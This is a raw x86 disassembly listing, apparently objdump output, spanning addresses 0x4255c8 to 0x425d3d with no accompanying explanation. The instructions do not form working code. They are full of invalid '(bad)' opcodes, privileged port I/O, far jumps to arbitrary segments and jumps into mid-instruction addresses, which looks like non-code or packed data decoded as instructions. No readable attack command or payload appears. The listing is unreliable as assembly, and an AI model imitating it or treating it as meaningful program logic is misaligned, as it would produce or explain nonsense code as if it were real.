  4255c8:	or     al,0xfe
  4255ca:	sub    BYTE PTR [edi+0x4a],bh
  4255cd:	aaa    
  4255ce:	jge    0x4255ce
  4255d0:	push   cs
  4255d1:	adc    eax,0xf7dfbff9
  4255d6:	int    0x2c
  4255d8:	pushf  
  4255d9:	adc    al,0xff
  4255db:	sbb    cl,ch
  4255dd:	inc    ebx
  4255de:	sub    al,0x9d
  4255e0:	mov    bh,0x1f
  4255e2:	mov    dl,0xe7
  4255e4:	ins    BYTE PTR es:[edi],dx
  4255e5:	in     eax,0xd9
  4255e7:	(bad)  
  4255e8:	ficom  WORD PTR [eax-0x6280a428]
  4255ee:	dec    ecx
  4255ef:	add    al,0xfb
  4255f1:	lods   al,BYTE PTR ds:[esi]
  4255f2:	push   0xc9fd7ab5
  4255f7:	popa   
  4255f8:	dec    edx
  4255f9:	fisub  WORD PTR [ebx-0x37284c08]
  4255ff:	inc    eax
  425600:	jmp    0x425658
  425602:	xlat   BYTE PTR ds:[ebx]
  425603:	mov    ecx,0x61e86c35
  425608:	cmp    dh,BYTE PTR [ebp+0x33]
  42560b:	mov    ah,0x82
  42560d:	cld    
  42560e:	dec    edi
  42560f:	add    al,0x56
  425611:	neg    BYTE PTR [ebx]
  425613:	ins    BYTE PTR es:[edi],dx
  425614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425615:	nop
  425616:	(bad)  
  425617:	scas   al,BYTE PTR es:[edi]
  425618:	dec    ecx
  425619:	ror    esp,cl
  42561b:	xchg   ebx,eax
  42561c:	popa   
  42561d:	or     edi,esi
  42561f:	fmulp  st(5),st
  425621:	push   ds
  425622:	lds    edx,FWORD PTR es:[ebx+0x6864f7d1]
  425629:	jo     0x42564c
  42562b:	ret    0xb8d9
  42562e:	stos   DWORD PTR es:[di],eax
  425630:	fist   DWORD PTR [edx-0x48]
  425633:	repnz lahf 
  425635:	sub    al,0x60
  425637:	pop    esi
  425638:	add    cl,dl
  42563a:	dec    esp
  42563b:	stos   DWORD PTR es:[edi],eax
  42563c:	rol    DWORD PTR [edi-0x5c],1
  42563f:	sub    al,0x56
  425641:	shl    BYTE PTR [esi-0x4d],1
  425644:	test   DWORD PTR [esi],ebx
  425646:	daa    
  425647:	jno    0x425669
  425649:	pusha  
  42564a:	dec    ebp
  42564b:	mov    bl,0x69
  42564d:	cmp    esp,ebp
  42564f:	pop    eax
  425650:	mov    dl,0x41
  425652:	fld    QWORD PTR [edx+0x33fc749e]
  425658:	adc    al,0xa1
  42565a:	xor    BYTE PTR [ecx],0x23
  42565d:	push   ss
  42565e:	pop    esp
  42565f:	out    dx,al
  425660:	scas   al,BYTE PTR es:[edi]
  425661:	popf   
  425662:	icebp  
  425663:	icebp  
  425664:	call   0x975f5b77
  425669:	es cmp al,0x8f
  42566c:	mov    ds:0xaed6eea5,al
  425671:	jmp    0x816:0x82fb33e9
  425678:	push   0x7d15d588
  42567d:	inc    edi
  42567e:	jmp    0x27de2418
  425683:	fs pop esp
  425685:	mov    ?,ebp
  425687:	dec    ebx
  425688:	jle    0x4256ba
  42568a:	push   edx
  42568b:	mov    dl,0xbf
  42568d:	int    0x60
  42568f:	push   ebp
  425690:	and    ch,BYTE PTR [ecx-0x234cec73]
  425696:	xchg   ebp,eax
  425697:	add    al,0x72
  425699:	jp     0x4256f6
  42569b:	(bad)
  42569e:	xor    cl,BYTE PTR [edi]
  4256a0:	mov    ecx,0xc65e2822
  4256a5:	jno    0x4256f3
  4256a7:	inc    ebp
  4256a8:	shl    dl,1
  4256aa:	mov    ds:0x95afc63,eax
  4256af:	cmp    al,0xe3
  4256b1:	or     dh,BYTE PTR [esi+0x25d3c853]
  4256b7:	cmc    
  4256b8:	out    dx,al
  4256b9:	sahf   
  4256ba:	fild   DWORD PTR [ecx+0x1b24fed6]
  4256c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256c1:	in     eax,0x4
  4256c3:	ret    
  4256c4:	jnp    0x425723
  4256c6:	sbb    cl,BYTE PTR [ecx]
  4256c8:	aam    0xc7
  4256ca:	push   edx
  4256cb:	xor    BYTE PTR [ebp-0x8ca70b6],dl
  4256d1:	xor    cl,BYTE PTR [ecx+0x44]
  4256d4:	loop   0x42570e
  4256d6:	and    BYTE PTR [esi+ebx*1],bl
  4256d9:	mov    esp,0xe8311bc9
  4256de:	sti    
  4256df:	aaa    
  4256e0:	mov    ch,0x8b
  4256e2:	push   cs
  4256e3:	imul   ecx,esi,0xffffffad
  4256e6:	outs   dx,DWORD PTR ds:[esi]
  4256e7:	imul   eax,DWORD PTR [esi],0xc41d58b3
  4256ed:	hlt    
  4256ee:	jb     0x4256de
  4256f0:	mov    BYTE PTR [ebp-0x49],ah
  4256f3:	jnp    0x42575b
  4256f5:	stos   BYTE PTR es:[edi],al
  4256f6:	or     DWORD PTR [edi+0x72642d14],ebp
  4256fc:	xor    eax,0xe7f7d0f2
  425701:	ja     0x4256f2
  425703:	inc    ebp
  425704:	pop    esi
  425705:	push   ebx
  425706:	add    DWORD PTR [ecx+ebp*2-0x6a],ebp
  42570a:	mov    al,ds:0x5d1dc8d2
  42570f:	add    BYTE PTR [esp+eax*1-0x58],ah
  425713:	mov    DWORD PTR [eax+0x5],edx
  425716:	cwde   
  425717:	dec    ebx
  425718:	rol    DWORD PTR [edx],cl
  42571a:	mov    dh,0x5d
  42571c:	lea    ebp,[edi+eax*1-0x75]
  425720:	cwde   
  425721:	push   esp
  425722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425723:	pop    esp
  425724:	mov    ebp,0xe21cc8e
  425729:	adc    DWORD PTR [esi+edx*4+0x7b],ebx
  42572d:	jmp    0x42570f
  42572f:	pop    edi
  425730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425731:	inc    esi
  425732:	loopne 0x42578f
  425734:	push   ecx
  425735:	and    ecx,edx
  425737:	fwait
  425738:	out    dx,al
  425739:	mov    dl,0xa5
  42573b:	and    DWORD PTR [edi-0x33],edi
  42573e:	(bad)  
  42573f:	test   eax,0x1eba7b1e
  425744:	add    cl,BYTE PTR [edx+0x793b2fbc]
  42574a:	sub    eax,0xc2e748c4
  42574f:	sub    ebx,DWORD PTR [ebp+0x35]
  425752:	sbb    ebp,edx
  425754:	mov    al,0x89
  425756:	ss in  eax,dx
  425758:	pusha  
  425759:	stos   BYTE PTR es:[edi],al
  42575a:	rcl    BYTE PTR [ebp-0x58f43dcc],cl
  425760:	outs   dx,BYTE PTR ds:[esi]
  425761:	stos   DWORD PTR es:[edi],eax
  425762:	xchg   esp,eax
  425763:	repnz xchg esi,eax
  425765:	out    dx,eax
  425766:	cmp    ah,BYTE PTR [edx]
  425768:	nop
  425769:	or     al,0xa6
  42576b:	pop    edx
  42576c:	push   es
  42576d:	sub    eax,0x126bb8ba
  425772:	(bad)  
  425773:	div    BYTE PTR [edx+esi*1+0x6eec7cf2]
  42577a:	test   BYTE PTR [ecx],dh
  42577c:	sub    al,0x84
  42577e:	sub    al,0xd8
  425780:	dec    esp
  425781:	push   eax
  425782:	mov    eax,0x7f00ef46
  425787:	sub    esp,DWORD PTR [ebp+esi*4-0x1ee03eb8]
  42578e:	clc    
  42578f:	icebp  
  425790:	aas    
  425791:	mov    ds:0x3b25d0c2,al
  425796:	lahf   
  425797:	std    
  425798:	clc    
  425799:	mov    BYTE PTR [edi+0x76e5120e],bh
	...
  4257a7:	add    BYTE PTR [eax],al
  4257a9:	add    BYTE PTR [edx+0x43],cl
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)  
  4257b8:	jle    0x42582d
  4257ba:	and    ch,ah
  4257bc:	add    DWORD PTR [eax],eax
  4257be:	jge    0x4257c6
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	dec    ebx
  4257c3:	shl    DWORD PTR [ecx-0x6bcab58b],cl
  4257c9:	cmp    ch,dh
  4257cb:	pop    edi
  4257cc:	es ins BYTE PTR es:[edi],dx
  4257ce:	test   DWORD PTR fs:[eax+0x42],esp
  4257d2:	mul    DWORD PTR ds:0x802d96d1
  4257d8:	sub    al,0x45
  4257da:	scas   al,BYTE PTR es:[edi]
  4257db:	(bad)  
  4257dc:	push   edx
  4257dd:	rol    BYTE PTR [ebp-0x43],cl
  4257e0:	icebp  
  4257e1:	(bad)  
  4257e2:	jmp    0xadf2:0x1d6d6b8d
  4257e9:	out    dx,al
  4257ea:	jp     0x425820
  4257ec:	dec    eax
  4257ed:	xchg   ebx,eax
  4257ee:	hlt    
  4257ef:	emms   
  4257f1:	push   ebx
  4257f2:	mov    esi,0x46a5ad38
  4257f7:	test   eax,0x75080362
  4257fc:	sub    BYTE PTR [esi+0x2ff30d9f],dl
  425802:	jnp    0x4257df
  425804:	out    dx,al
  425805:	repnz xor edi,DWORD PTR [edx+0x74]
  425809:	jnp    0x4257a2
  42580b:	mov    ebp,0x1988dfb3
  425810:	mov    ah,BYTE PTR [edi+0x73]
  425813:	js     0x425826
  425815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425816:	mov    dh,BYTE PTR [ebp+0x73]
  425819:	fisub  DWORD PTR [esi-0x6a]
  42581c:	mov    ah,0x4f
  42581e:	add    al,0x63
  425820:	cmp    dl,bl
  425822:	push   ss
  425823:	int3   
  425824:	mov    edi,0x1c8b0fa
  425829:	sub    edi,DWORD PTR [esi]
  42582b:	outs   dx,DWORD PTR ds:[esi]
  42582c:	push   ecx
  42582d:	sbb    al,0xe3
  42582f:	dec    ebx
  425830:	mov    esi,0x372b4109
  425835:	dec    esi
  425836:	inc    eax
  425837:	mov    bl,0xce
  425839:	pop    edi
  42583a:	dec    edi
  42583b:	pop    edi
  42583c:	mov    eax,0xebf81794
  425841:	mov    bl,0xc5
  425843:	out    0x6,al
  425845:	int    0x39
  425847:	call   0xc372:0x40a537b1
  42584e:	sbb    eax,DWORD PTR [eax+0x70]
  425851:	jo     0x4258ad
  425853:	xor    BYTE PTR [ebx+0x4c7c6cb7],al
  425859:	sub    edi,ebp
  42585b:	xchg   BYTE PTR [ebp+0x76],ah
  42585e:	popf   
  42585f:	cdq    
  425860:	cwde   
  425861:	jl     0x4258c5
  425863:	test   eax,0x98178f37
  425868:	fstp   QWORD PTR es:[eax-0x6205afcc]
  42586f:	ins    BYTE PTR es:[edi],dx
  425870:	adc    BYTE PTR [edi],ch
  425872:	mov    ebp,0xa17a6ffe
  425877:	fdivr  DWORD PTR [edx-0x2484c841]
  42587d:	stos   DWORD PTR es:[edi],eax
  42587e:	imul   ebx,DWORD PTR [esi-0x3e2c8cc1],0x31530e6e
  425888:	dec    DWORD PTR ds:0x78b1129
  42588e:	shl    BYTE PTR [esi-0xd],cl
  425891:	jle    0x42588d
  425893:	inc    esi
  425894:	push   eax
  425895:	push   ecx
  425896:	jae    0x42589e
  425898:	(bad)  
  425899:	xchg   edx,eax
  42589a:	mov    ebp,0xc98225be
  42589f:	fmul   DWORD PTR [esi-0x2d4f8833]
  4258a5:	xchg   BYTE PTR [edx],dl
  4258a7:	sbb    ecx,DWORD PTR [ebp-0x187c0f01]
  4258ad:	sub    BYTE PTR [eax],bl
  4258af:	leave  
  4258b0:	addr16 pop esp
  4258b2:	aas    
  4258b3:	mov    cl,0x9d
  4258b5:	inc    esp
  4258b6:	sub    edx,ebx
  4258b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258b9:	fidiv  WORD PTR es:[edx+0x67]
  4258bd:	test   DWORD PTR [edi],edx
  4258bf:	mov    al,ds:0xd093496e
  4258c4:	sub    DWORD PTR [esi],ecx
  4258c6:	outs   dx,DWORD PTR ds:[esi]
  4258c7:	sub    BYTE PTR [ecx-0x15],ch
  4258ca:	in     eax,0x35
  4258cc:	and    bl,BYTE PTR [edi]
  4258ce:	add    DWORD PTR [edx+edx*1-0x2a],0xffffff9f
  4258d3:	dec    DWORD PTR [edi-0x29637225]
  4258d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258da:	shl    bh,1
  4258dc:	pusha  
  4258dd:	cwde   
  4258de:	adc    eax,0x9a603c0f
  4258e3:	and    eax,DWORD PTR [edi]
  4258e5:	cld    
  4258e6:	jno    0x42588a
  4258e8:	out    dx,eax
  4258e9:	aas    
  4258ea:	lock (bad) 
  4258ec:	shl    BYTE PTR [edi],0x16
  4258ef:	fbld   TBYTE PTR [edi]
  4258f1:	dec    ebp
  4258f2:	adc    ebp,esi
  4258f4:	test   al,0xdd
  4258f6:	jmp    0x4258b6
  4258f8:	es aam 0x1c
  4258fb:	xchg   ebp,eax
  4258fc:	retf   
  4258fd:	dec    ebx
  4258fe:	xlat   BYTE PTR ds:[ebx]
  4258ff:	in     eax,dx
  425900:	stos   DWORD PTR es:[edi],eax
  425901:	jno    0x425951
  425903:	xchg   edx,eax
  425904:	addr16 mov ecx,0x8563e816
  42590a:	add    bh,BYTE PTR [ebx+0x7]
  42590d:	mov    dh,0xb6
  42590f:	or     DWORD PTR [ebp+0x52f43e25],0xd06146f9
  425919:	xor    ebp,0x576eaeed
  42591f:	fisttp DWORD PTR [eax-0x2cca921e]
  425925:	in     al,dx
  425926:	and    BYTE PTR [ecx+esi*8],0x75
  42592a:	aam    0x9d
  42592c:	push   esp
  42592d:	mov    al,0x48
  42592f:	and    ecx,0x1d
  425932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425933:	pushf  
  425934:	(bad)  
  425935:	mov    ah,0x93
  425937:	test   esi,edx
  425939:	xchg   esi,edx
  42593b:	jnp    0x42593e
  42593d:	cli    
  42593e:	jno    0x4258d1
  425940:	or     DWORD PTR [ebx-0x15ee0114],0x9bcc9cf3
  42594a:	(bad)  
  42594b:	jmp    0x893:0xc2b0f72d
  425952:	add    esp,DWORD PTR [ebx+ecx*2-0x7f349cc9]
  425959:	lods   al,BYTE PTR ds:[esi]
  42595a:	cmp    BYTE PTR [ebx-0x43],dl
  42595d:	cmp    eax,0x81a23652
  425962:	fs sub ax,0x8655
  425967:	push   edi
  425968:	dec    ebp
  425969:	and    DWORD PTR [edx-0x410875f5],ebx
  42596f:	stos   DWORD PTR es:[edi],eax
  425970:	jnp    0x4259bc
  425972:	icebp  
  425973:	push   es
  425974:	inc    BYTE PTR [esi-0x1f]
  425977:	into   
  425978:	call   0xe95a:0xaa40bdd8
  42597f:	dec    edi
  425980:	push   ecx
  425981:	nop
  425982:	xor    dl,cl
  425984:	mov    ?,edx
  425986:	mov    eax,DWORD PTR [ecx]
  425988:	xor    BYTE PTR [ebx-0x12fbe5ec],0x4e
  42598f:	mov    dl,0xc7
  425991:	js     0x4259cb
  425993:	test   eax,0x992cf542
  425998:	shld   edi,edx,cl
  42599b:	or     al,0xd2
  42599d:	push   eax
  42599e:	add    bl,BYTE PTR [ebp+0x77]
  4259a1:	ret    
  4259a2:	add    al,0xf3
  4259a4:	mov    al,0x86
  4259a6:	ja     0x425935
  4259a8:	sti    
  4259a9:	ds fwait
  4259ab:	mov    ebx,0xef1a68df
  4259b0:	or     BYTE PTR [edi],cl
  4259b2:	push   esi
  4259b3:	in     eax,0x92
  4259b5:	scas   eax,DWORD PTR es:[edi]
  4259b6:	and    dl,ch
  4259b8:	popf   
  4259b9:	pop    esp
  4259ba:	xchg   ecx,eax
  4259bb:	call   0xeae8:0x11b714bb
  4259c2:	xchg   edi,eax
  4259c3:	int    0x6e
  4259c5:	jle    0x4259ee
  4259c7:	and    BYTE PTR [eax],ch
  4259c9:	pop    esi
  4259ca:	std    
  4259cb:	push   0xffffff91
  4259cd:	xchg   edi,eax
  4259ce:	enter  0xac96,0x49
  4259d2:	adc    BYTE PTR [edi+0x19],0xd3
  4259d6:	pop    edx
  4259d7:	cmp    edi,edx
  4259d9:	xchg   esp,eax
  4259da:	push   edx
  4259db:	dec    esp
  4259dc:	push   0xffffff99
  4259de:	fadd   QWORD PTR [ebx+0x77]
  4259e1:	repz jp 0x425a26
  4259e4:	mov    dh,0xe4
  4259e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259e7:	rcl    BYTE PTR [ebx-0x1],cl
  4259ea:	test   eax,0x1056f4a2
  4259ef:	scas   al,BYTE PTR es:[edi]
  4259f0:	shl    BYTE PTR [ebx-0x47a079b],1
  4259f6:	sbb    eax,ecx
  4259f8:	aaa    
  4259f9:	out    0x17,eax
  4259fb:	fsubr  DWORD PTR [ebx-0x40400db5]
  425a01:	jp     0x425a12
  425a03:	enter  0x57fd,0x1b
  425a07:	aam    0xf3
  425a09:	mov    ecx,0x5c976eef
  425a0e:	(bad)  [ecx]
  425a10:	xchg   DWORD PTR [esi+0x6fd2f282],eax
  425a16:	pop    ebp
  425a17:	outs   dx,DWORD PTR ds:[esi]
  425a18:	retf   0x109d
  425a1b:	mov    cl,0x87
  425a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1e:	dec    esp
  425a1f:	dec    ebp
  425a20:	add    eax,0xc3cfc848
  425a25:	sbb    eax,0x1b545114
  425a2a:	loopne 0x425a37
  425a2c:	jbe    0x4259d4
  425a2e:	push   0xffffffe1
  425a30:	ins    DWORD PTR es:[edi],dx
  425a31:	xchg   ecx,eax
  425a32:	das    
  425a33:	fsub   DWORD PTR [eax]
  425a35:	xchg   ebp,eax
  425a36:	jecxz  0x4259f1
  425a38:	dec    ecx
  425a39:	or     edx,DWORD PTR [eax-0x11e2e447]
  425a3f:	ds (bad) 
  425a41:	xor    DWORD PTR [eax+0x6d],ecx
  425a44:	and    bh,BYTE PTR [ebx+0x3d]
  425a47:	es test al,0x42
  425a4a:	xchg   esp,eax
  425a4b:	and    esi,eax
  425a4d:	cld    
  425a4e:	and    al,0xe2
  425a50:	scas   al,BYTE PTR es:[edi]
  425a51:	mov    eax,0xd701ad9d
  425a56:	pop    edx
  425a57:	push   edx
  425a58:	push   cs
  425a59:	imul   esi,DWORD PTR [ecx-0x2b],0xffffffd5
  425a5d:	and    al,0xbf
  425a5f:	push   0x8153b8bc
  425a64:	and    BYTE PTR [ecx],bl
  425a66:	jecxz  0x425a1e
  425a68:	ror    ecx,0x2c
  425a6b:	dec    esp
  425a6c:	das    
  425a6d:	cmp    BYTE PTR [edi-0x684cd8bf],al
  425a73:	icebp  
  425a74:	mov    ecx,0xc2760e6e
  425a79:	stos   DWORD PTR es:[edi],eax
  425a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a7b:	push   cs
  425a7c:	cmp    al,0xa8
  425a7e:	sub    cl,BYTE PTR [eax]
  425a80:	ja     0x425a98
  425a82:	cmp    al,0x69
  425a84:	add    eax,0x64319dd4
  425a89:	push   edi
  425a8a:	dec    ebx
  425a8b:	push   edi
  425a8c:	lock cs js 0x425b06
  425a90:	and    ch,dl
  425a92:	repz cli 
  425a94:	pop    ds
  425a95:	mov    ebx,0xc153761d
  425a9a:	dec    esi
  425a9b:	mov    bl,bh
  425a9d:	mov    ecx,0x98b24b38
  425aa2:	daa    
  425aa3:	not    bl
  425aa5:	xchg   edi,eax
  425aa6:	adc    eax,0xe46a9ccd
  425aab:	and    edx,esi
  425aad:	mov    esp,gs
  425aaf:	and    BYTE PTR ds:0x9af8405d,bh
  425ab5:	call   0x67ebd00f
  425aba:	adc    bh,bh
  425abc:	(bad)  
  425abd:	out    0x88,eax
  425abf:	leave  
  425ac0:	out    0x62,eax
  425ac2:	cmp    cl,BYTE PTR [eax]
  425ac4:	leave  
  425ac5:	sub    edx,edx
  425ac7:	mov    ds:0x5706da61,al
  425acc:	fwait
  425acd:	sbb    al,0x5b
  425acf:	mov    bl,0x13
  425ad1:	cmp    DWORD PTR [edi+0x6f],esi
  425ad4:	add    BYTE PTR [esi+esi*4],ch
  425ad7:	cdq    
  425ad8:	or     BYTE PTR [eax+0x30],bl
  425adb:	out    0x49,al
  425add:	mov    ebx,DWORD PTR [edx]
  425adf:	jg     0x425b3c
  425ae1:	inc    edi
  425ae2:	mov    al,ds:0xa172de20
  425ae7:	pop    esi
  425ae8:	shr    eax,cl
  425aea:	mov    ds:0x4967793c,eax
  425aef:	aad    0x8e
  425af1:	inc    edx
  425af2:	xlat   BYTE PTR ds:[ebx]
  425af3:	in     al,0xcc
  425af5:	mov    dl,0x7f
  425af7:	gs int 0x52
  425afa:	xlat   BYTE PTR ds:[ebx]
  425afb:	xchg   edx,eax
  425afc:	xor    edx,ecx
  425afe:	retf   0x4ac4
  425b01:	xchg   edi,eax
  425b02:	sub    edx,eax
  425b04:	xor    ch,dh
  425b06:	(bad)  
  425b07:	cmp    al,0x3a
  425b09:	sub    BYTE PTR [edx],al
  425b0b:	mov    ch,0xf6
  425b0d:	imul   ebp,DWORD PTR [ecx+0x268c0cb2],0xf
  425b14:	mov    ebp,0x6062ce75
  425b19:	cmp    al,0x1a
  425b1b:	aaa    
  425b1c:	shr    dh,cl
  425b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b1f:	test   BYTE PTR [ebx+eiz*4],al
  425b22:	cs icebp 
  425b24:	test   al,0xaa
  425b26:	jae    0x425b51
  425b28:	xchg   ecx,eax
  425b29:	stos   BYTE PTR es:[edi],al
  425b2a:	setno  BYTE PTR [ebp-0x46]
  425b2e:	int    0x62
  425b30:	fadd   st,st(3)
  425b32:	(bad)  
  425b33:	lds    esi,FWORD PTR [esi-0x61]
  425b36:	rcl    ch,cl
  425b38:	cmc    
  425b39:	fadd   QWORD PTR [ebx-0x3e02989d]
  425b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b40:	dec    esi
  425b41:	jmp    0xb8ea:0x1f7b7bfd
  425b48:	std    
  425b49:	xor    ebp,esi
  425b4b:	dec    BYTE PTR [ecx]
  425b4d:	cmp    ebx,DWORD PTR [edx+ecx*4-0x66]
  425b51:	lock cmp al,0xb4
  425b54:	scas   eax,DWORD PTR es:[edi]
  425b55:	cmp    eax,0x1436dbc
  425b5a:	cld    
  425b5b:	mov    WORD PTR [esi],fs
  425b5d:	xchg   esi,eax
  425b5e:	sbb    DWORD PTR [esi],edx
  425b60:	je     0x425baa
  425b62:	push   ds
  425b63:	and    edx,DWORD PTR [ebx-0x37f5f519]
  425b69:	fnstcw WORD PTR [edx]
  425b6b:	cdq    
  425b6c:	adc    al,0x47
  425b6e:	jo     0x425b6c
  425b70:	lock xchg ecx,eax
  425b72:	cld    
  425b73:	push   ecx
  425b74:	add    eax,0xc41a6e5f
  425b79:	and    BYTE PTR ds:0xcd15699d,ah
  425b7f:	dec    ebx
  425b80:	loopne 0x425b43
  425b82:	(bad)  
  425b83:	out    dx,eax
  425b84:	popa   
  425b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b86:	or     eax,0xffffffc5
  425b89:	and    DWORD PTR [edi],edi
  425b8b:	cmp    al,0x8d
  425b8d:	pop    ss
  425b8e:	repz sbb BYTE PTR [ebx],dh
  425b91:	dec    ebp
  425b92:	cmc    
  425b93:	and    al,0x72
  425b95:	daa    
  425b96:	jo     0x425b1d
  425b98:	test   eax,0xb4b253be
  425b9d:	rol    ebx,0xe0
  425ba0:	leave  
  425ba1:	repnz pop esi
  425ba3:	jns    0x425bcc
  425ba5:	cld    
  425ba6:	loop   0x425c0e
  425ba8:	mov    ax,?
  425bab:	out    dx,eax
  425bac:	mov    bh,0x32
  425bae:	outs   dx,BYTE PTR ds:[esi]
  425baf:	mov    eax,ds:0xc77304e2
  425bb4:	push   0xffffffd0
  425bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bb7:	cmp    dh,BYTE PTR [ebx]
  425bb9:	cmp    DWORD PTR [edi],edi
  425bbb:	pop    esp
  425bbc:	sub    BYTE PTR [ebx+0x1b],dl
  425bbf:	fld    TBYTE PTR [esi+0x47]
  425bc2:	xor    bl,BYTE PTR [eax]
  425bc4:	in     al,0x3
  425bc6:	or     DWORD PTR [eax-0x562bea6a],ebp
  425bcc:	fnstsw WORD PTR [eax+ecx*8-0x2818b947]
  425bd3:	out    0xf,al
  425bd5:	pop    ebx
  425bd6:	scas   al,BYTE PTR es:[edi]
  425bd7:	ja     0x425b94
  425bd9:	retf   
  425bda:	mov    ecx,ebp
  425bdc:	pop    ds
  425bdd:	repz into 
  425bdf:	mov    bl,0xe8
  425be1:	mov    ecx,0x432a89f5
  425be6:	dec    eax
  425be7:	imul   ebx,DWORD PTR gs:[edx+0x380deb4f],0x7969312f
  425bf2:	arpl   WORD PTR [edi-0x7b],bp
  425bf5:	(bad)  
  425bf6:	mov    edi,cr0
  425bf9:	mov    ch,0xfc
  425bfb:	dec    edx
  425bfc:	cli    
  425bfd:	cmc    
  425bfe:	mov    al,ds:0xd77dc9fb
  425c03:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  425c05:	in     al,dx
  425c06:	push   edi
  425c07:	jnp    0x425c81
  425c09:	(bad)  [edx]
  425c0b:	mov    al,ds:0xd4531f77
  425c10:	and    eax,0xce8e908a
  425c15:	xchg   ecx,eax
  425c16:	mov    al,ds:0x2e2ab1a0
  425c1b:	arpl   WORD PTR [esi+0x58],si
  425c1e:	push   ebx
  425c1f:	sahf   
  425c20:	add    al,0x95
  425c22:	xlat   BYTE PTR ds:[ebx]
  425c23:	jns    0x425c72
  425c25:	outs   dx,BYTE PTR ds:[esi]
  425c26:	(bad)  
  425c27:	jmp    0x2553:0x65a79090
  425c2e:	pop    esp
  425c2f:	pushf  
  425c30:	or     al,0xc4
  425c32:	jb     0x425bef
  425c34:	mov    edx,0xfbf35bd6
  425c39:	test   DWORD PTR [ebx-0x5d1958df],ebx
  425c3f:	in     al,dx
  425c40:	jbe    0x425c61
  425c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c43:	stos   BYTE PTR es:[edi],al
  425c44:	call   0x27e6:0xc097766d
  425c4b:	int    0xc2
  425c4d:	xor    eax,0xaf612517
  425c52:	enter  0x9eca,0x1f
  425c56:	lods   al,BYTE PTR ds:[esi]
  425c57:	mov    bh,0xef
  425c59:	and    DWORD PTR [ecx],ebp
  425c5b:	mov    ds:0x7f1fca6,al
  425c60:	jb     0x425cae
  425c62:	aaa    
  425c63:	jo     0x425c25
  425c65:	retf   
  425c66:	sahf   
  425c67:	jae    0x425c26
  425c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c6a:	pop    ss
  425c6b:	jle    0x425c6b
  425c6d:	jae    0x425bfb
  425c6f:	sbb    esp,DWORD PTR [ebx+0x42]
  425c72:	call   0x559d:0xd5132628
  425c79:	pop    ecx
  425c7a:	inc    esp
  425c7b:	inc    eax
  425c7c:	imul   edi,DWORD PTR [esi-0x6c280e9a],0xba00b36f
  425c86:	push   esi
  425c87:	pusha  
  425c88:	push   ss
  425c89:	stc    
  425c8a:	hlt    
  425c8b:	loope  0x425c22
  425c8d:	fwait
  425c8e:	hlt    
  425c8f:	push   es
  425c90:	inc    DWORD PTR [esi+0x70]
  425c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c94:	lds    esp,FWORD PTR [ebx]
  425c96:	mov    al,ds:0x2931f4f4
  425c9b:	jmp    0xa3b9f00d
  425ca0:	add    dh,dh
  425ca2:	and    eax,0x729e9285
  425ca7:	mov    dh,0x5b
  425ca9:	loop   0x425c87
  425cab:	retf   
  425cac:	aam    0x89
  425cae:	rcr    esi,cl
  425cb0:	jo     0x425c72
  425cb2:	inc    esi
  425cb3:	pop    ebx
  425cb4:	(bad)  
  425cb5:	and    BYTE PTR [edx+eax*8-0x8],dl
  425cb9:	vpmacsww xmm4,xmm6,xmm7,xmm2
  425cbf:	xchg   DWORD PTR [esi],edx
  425cc1:	inc    esi
  425cc2:	sti    
  425cc3:	and    esi,DWORD PTR [ebp+0x36deb33b]
  425cc9:	leave  
  425cca:	imul   esi,DWORD PTR [ebx-0x5a],0xd49b5f63
  425cd1:	dec    edi
  425cd2:	out    dx,al
  425cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cd4:	pop    ebp
  425cd5:	sub    edi,DWORD PTR [eax+edx*4-0x1a7e4aed]
  425cdc:	dec    esp
  425cdd:	mov    BYTE PTR fs:0xdcf11f62,0xfc
  425ce5:	dec    esi
  425ce6:	xchg   DWORD PTR [eax],ebx
  425ce8:	xor    dh,BYTE PTR [ebp-0x1d]
  425ceb:	dec    esi
  425cec:	cmp    BYTE PTR [ecx+edi*8],al
  425cef:	retf   
  425cf0:	xchg   BYTE PTR [edi+0x34],dh
  425cf3:	mov    ebx,DWORD PTR [edx+0x69]
  425cf6:	jbe    0x425c83
  425cf8:	in     eax,0x97
  425cfa:	sti    
  425cfb:	adc    DWORD PTR [ebx-0x513bcfc5],ebx
  425d01:	sbb    BYTE PTR [edx-0x39],al
  425d04:	icebp  
  425d05:	inc    esi
  425d06:	add    ecx,esp
  425d08:	xchg   esi,eax
  425d09:	mov    dl,bl
  425d0b:	xchg   ecx,eax
  425d0c:	adc    ecx,DWORD PTR [edi+eax*8+0x41]
  425d10:	fdiv   QWORD PTR [ebx+0x34]
  425d13:	or     ecx,0x7bd32c02
  425d19:	repz jne 0x425d1a
  425d1c:	or     DWORD PTR [eax-0xb],edi
  425d1f:	lahf   
  425d20:	std    
  425d21:	push   ds
  425d22:	pcmpeqb mm5,QWORD PTR [esi]
  425d25:	mov    edi,DWORD PTR [edx-0x46]
  425d28:	test   DWORD PTR [edi+esi*8-0x3d159410],0x666c0389
  425d33:	aaa    
  425d34:	or     BYTE PTR [eax+0x16719a8c],cl
  425d3a:	in     al,dx
  425d3b:	aam    0x5e
  425d3d:	add    eax,0x4b7c8be1
